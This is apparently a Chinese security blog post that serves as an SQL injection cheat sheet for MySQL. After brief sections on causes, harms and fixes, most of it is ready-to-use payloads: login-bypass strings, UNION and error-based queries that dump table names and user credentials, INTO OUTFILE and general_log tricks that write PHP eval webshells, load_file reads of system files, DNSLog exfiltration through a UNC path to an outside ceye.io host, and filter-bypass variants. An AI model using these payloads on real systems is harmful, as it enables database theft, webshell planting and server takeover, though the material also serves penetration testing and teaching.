---
author: YOUZAI
title: SQL 注入漏洞
date: 2023/04/25
categories:
 - 常见漏洞
tags:
 - WEB安全
---

## 漏洞原理

SQL 注入就是指 web 应用程序对用户输入的数据合法性没有过滤或者是判断，前端传入的参数是攻击者可以控制，并且参数带入数据库的查询，攻击者可以通过构造恶意的 SQL 语句来实现对数据库的任意操作。

## 漏洞危害

* 数据库信息泄露：数据库中存放的用户隐私信息的泄露。
* 网页篡改：通过操作数据库对特定网页进行篡。
* 网页被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。
* 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账户被篡改。
* 服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持让黑客得以修改或控制操作系统。
* 破坏硬盘数据，瘫痪全系统。

## 修复建议

* 使用参数化查询，将查询逻辑与查询数据分离。
* 严格限定参数类型和格式，明确参数校验的边界，必须在服务端正式处理之前对提交的数据的合法性进行检查。
* 替换或删除敏感字符或字符串。
* 将动态 SQL 语句替换为存储过程。
* 验证输入，即白/黑名单验证。
* 最小化 SQL 权限。
* 一致的错误消息机制，屏蔽出错信息。

## 常见数据库

|数据库|默认端口|默认用户名|
|:-:|:-:|:-:|
|MySQL|3306|root|
|MsSQL|1433|sa|
|Oracle|1521|sys/system|
|postgresql|5432|postgres|
|Redis|6379||

## 站库分离

* MySQL

定位 web 端 IP 地址：

```sql
select * from information_schema.PROCESSLIST;
```

* MsSQL

查询客户端主机名：

```sql
select host_name();
```

查询服务端主机名：

```sql
select @@servername
```

## MySQL

### 常用函数

* 获取系统信息

```sql
current_user()	# 当前用户名。
system_user(); # 当前的用户名和主机名。
session_user()	# 连接数据库的用户名。
@@basedir    # mysql 安装路径。
@@datadir    # 数据库路径。
version() # 返回当前数据库的版本信息。
@@version_compile_os	# 操作系统版本。
```

* 字符串连接

`concat` `concat_ws` `group_concat`
```sql
select concat(id,'|',username,'|',password) from users;
select concat_ws('|',id,username,password) from users;
select group_concat('\n',username) from users;
```

* 字符串操作

`substr` `mid` `left` `right` `locate`

```sql
select substr((select username from users limit 0,1),1,2); # substr(str,pos,len)，str-->字符串，pos-->截取位置，从1开始，len-->截取长度；limit表示从记录中第n个开始（n>=0)，取m条记录。
select mid('martin',2,3); # mid(str,pos,len)，str-->字符串，pos-->截取位置，从1开始，len-->截取长度
select left('martin',2); # left(str,len)，str-->字符串，len-->长度，从左开始截取长度为len的字符串
select right('martin',2); # right(str,len)，str-->字符串，len-->长度，从右开始截取长度为len的字符串
select locate('security','1234security'); # 返回第一个字符串在第二个字符串首次出现的位置。
select strcmp('abc','abc'); # 比较两个字符串是否相等，相等返回 0，str1>str2 返回1，str1<str2 返回-1。
```

* 返回指定 ASCII 字符对应的值

`ascii` `ord`

```sql
select ascii('a');
select ord('a');
```

* 返回指定数字对应的 ASCII 码

`char`

```sql
select char(97);
```

* 计算相关

`length` `count`

```sql
select length(database()); # 计算数据库名长度。
select count(*) from users;
```

* 时间相关

`sleep` `if` `benchmark`

```sql
select sleep(5); # 睡眠5秒
(select*from(select(sleep(5)))a)
select if((locate('s',database(),1)=1),sleep(5),1); # if(expr1,expr2,expr3)
select benchmark(10000000,sha(1)); # benchmark(loop_count,expr)，loop_count 表示循环次数，expr 执行的表达式。
select get_lock('test',1);  # get_lock(lock_name,timeout)，lock_name 表示锁名，timeout 表示超时时间。
```

* 注释方法

`#` `--+` `/* */` `/*! */` `/*!50000 */` MySQL 5 通用 带版本内联注释。

### 注入语句

* 万能密码

```sql
'admin' or 1=1 #
'admin' or 'a'='a' or 'a'='a
```

* UNION 注入

1. 获取表名。

```sql
'-1' union select 1,group_concat('</br>',table_name),3 from information_schema.tables where table_schema=database() %23
```

2. 获取字段名。

```sql
'-1' union select 1,group_concat('</br>',column_name),3 from information_schema.columns where table_schema=database() and table_name='users' %23
```

3. 获取字段值。

```sql
'-1' union select 1,group_concat('</br>',username),group_concat('</br>',password) from users %23
```

* 报错注入

`updatexml`

```sql
UPDATEXML (XML_document, XPath_string, new_value) 改变文档中符合条件的节点的值。
XML_document：String 格式，为 XML 文档对象的名称。
XPath_string ：Xpath 格式的字符串。
new_value：String 格式，替换查找到的符合条件的数据。
```

1. 获取表名

```sql
'1' and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)) --+
```

2. 获取字段名

```sql
'1' and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e),1))--+ 
```

`extractvalue`

```sql
Extractvalue(xml_frag, xpath_expr) 函数使用 XPath 表示法从 XML 字符串中提取值。
xml_frag: 目标 xml 文档。
xpath_expr: 利用 Xpath 路径法表示的查找路径。
```

1. 获取表名

```sql
'1' and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))) --+
```

2. 获取字段名

```sql
'1' and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e))) --+ 
```

`floor`

```sql
floor(x) 函数，向下取整,返回一个不大于x的值。
```

```sql
'1' and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
```

### 文件写入

* 条件

- [x] 目录具有读写权限。
- [x] 网站绝对路径。
- [x] `secure_file_pri`为空。

```sql
'-1' union select 1,"<?php @eval($_GET[x]);?>",3,4,5 into outfile 'C:/Inetpub/wwwroot/cc.php'
```

写一句话木马：

```sql
union select 1,2,'<?php phpinfo()?>' into outfile "E\\phpStudy\\PHPTutoral\\www\\1.php" --+
union select 1,2,'<?php phpinfo()?>' into dumpfile "E\\phpStudy\\PHPTutoral\\www\\1.php" --+
```

`outfile`和`dumpdile`的区别：

`outfile`后面不能接 0x 开头或者 char 转换以后的路径，只能是单引号路径,但是值的部分可以是 16 进制。在使用 outfile 时,文件中一行的末尾会自动换行,且可以导出全部数据,同时如果文本中存在 \n 等字符,会自动转义成 \n,也就是会多加一个 \。outfile 函数可以导出多行，而 `dumpfile` 只能导出一行数据；outfile 函数在将数据写到文件里时有特殊的格式转换，而 dumpfile 则保持原数据格式。而使用 dumpfile 时,一行的末尾不会换行且只能导出部分数据（这里比较数据比较少,没有体现出来）；但 dumpfile 不会自动对文件内容进行转义,而是原意写入（这就是为什么我们平时 UDF 提权时使用 dumpfile 来写入的原因）。

堆叠注入写木马：

```sql
# 主要利用 mysql 日志来写 shell。
set global general_log = "ON";set global general_log_file='C:/wamp64/www/ma.php';select '<?php eval($_POST[cmd]);?>';
```

### 文件读取

* 条件

- [x] 目录具有读写权限。
- [x] `secure_file_pri`为空。

读取`secure_file_priv`配置：

```sql
SHOW VARIABLES LIKE "secure_file_priv"
```

|   值   |           说明           |
| :- | :- |
|`null`|      不允许导入导出      |
|`/tmp`| 只能在 /tmp 目录下导入导出 |
| `空` |       允许导入导出       |

写文件的时候还需要看 php.ini 里面 gpc 是否开启看，开启的情况下，特殊字符都会被转义。

```sql
union select 1,2,3,4,load_file('c:\\window\\win.ini')
union select load_file('c:/boot.ini')
union select load_file(0x633a2f626f6f742e696e69)
union select load_file('//ecma.io/1.txt') # smb 协议。
union select load_file('\\\\ecma.io\\1.txt') # 可用于DNS隧道。
union select load_file(char(47)) # 可以列出 FreeBSD，Sunos 系统的根目录，char(47) 就是 '/'。
```

### DNSLog 外带

* 条件

- [x] 目录具有读写权限。
- [x] `secure_file_pri`为空。
- [x] Windows 系统。

```sql
'1' and load_file(concat('\\\\',(select database()),'.27epx0.ceye.io\\abc'))--+ # 使用 Windows 下的 UNC 路径。
```

相应的更换`select database()`查询语句便可以实现 DNS 外带的回显注入，其中 27epx0.ceye.io 为 ceye.io 平台给每个账号起的昵称。

## 绕过技术

### 空格绕过

两个空格代替一个空格，用 Tab 代替空格，`%a0` = 空格：

* %20 %09 %0a %0b %0c %0d %a0 %00 /\*\*/  /\*!\*/

使用注释替换空格：

* /**/

![](/images/252e775042ff8d4fe13b7964ed95b885.png)

使用浮点数：

```sql
select * from users where id=8E0union select 1,2,3;
select * from users where id=8.0 select 1,2,3;
```

### 括号绕过

如果空格被过滤，括号没有被过滤，可以用括号绕过。在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。

```sql
select(user())from dual where(1=1)and(2=2);
```

这种过滤方法常常用于 time based 盲注，例如：

```sql
?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23;
```

::: info

from for 属于逗号绕过。

:::

### 引号绕过

会使用到引号的地方一般是在最后的`where`子句中。如下面的一条 sql 语句，这条语句就是一个简单的用来查选得到 users 表中所有字段的一条语句：

```sql
select column_name from information_schema.tables where table_name="users";
```

这个时候如果引号被过滤了，那么上面的 where 子句就无法使用了。那么遇到这样的问题就要使用**十六进制**来处理这个问题了。

users 的十六进制的字符串是 7573657273。那么最后的 sql 语句就变为了：

```sql
select column_name from information_schema.tables where table_name=0x7573657273;
```

### 逗号绕过

在使用盲注的时候，需要使用到`substr()`,`mid()`,`limit`。这些子句方法都需要使用到逗号。对于 substr() 和 mid() 这两个方法可以使用 `from for`的方式来解决：

```sql
select substr(database() from 1 for 1);
select mid(database() from 1 for 1);
```

::: tip

from for

语法：

```sql
SUBSTRING(str FROM pos FOR len);
```

* str 是将从其返回子字符串的字符串。
* Pos 是子字符串的起始位置。
* Len 是子字符串的长度，即从 str 提取的字符总数。

示例：

```sql
mysql> Select SUBSTRING('foobarbar' FROM 4 FOR 5);
+-------------------------------------+
| SUBSTRING('foobarbar' FROM 4 FOR 5) |
+-------------------------------------+
| barba                               |
+-------------------------------------+
1 row in set (0.00 sec)
```

:::

使用 join：

```sql
union select 1,2;
# 等价于
union select * from (select 1)a join (select 2)b;
```

使用 like：

```sql
select ascii(mid(user(),1,1))=80;
# 等价于
select user() like 'r%';
```

对于`limit`可以使用 `offset`来绕过：

```sql
select * from news limit 0,1;
# 等价于
select * from news limit 1 offset 0;
```

### 比较绕过

过滤了`<>`：sqlmap 盲注经常使用 <>，使用 between 的脚本：同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到 greatest 来进行绕过了。最常见的一个盲注的 sql 语句：

```sql
select * from users where id=1 and ascii(substr(database(),0,1))>64;
```

此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用`greatest`来代替比较操作符了。

::: tip

GREATEST

```sql
GREATEST(X1, X2, X3, ...);
```

该方法接受语法中的 N 个参数，它返回最大值。

:::

上面的 sql 语句可以变成：

```sql
select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64;
```

使用`between and`。

### 符号绕过

or and xor not绕过：

```sql
and=&&  or=||   xor=|   not=! 
```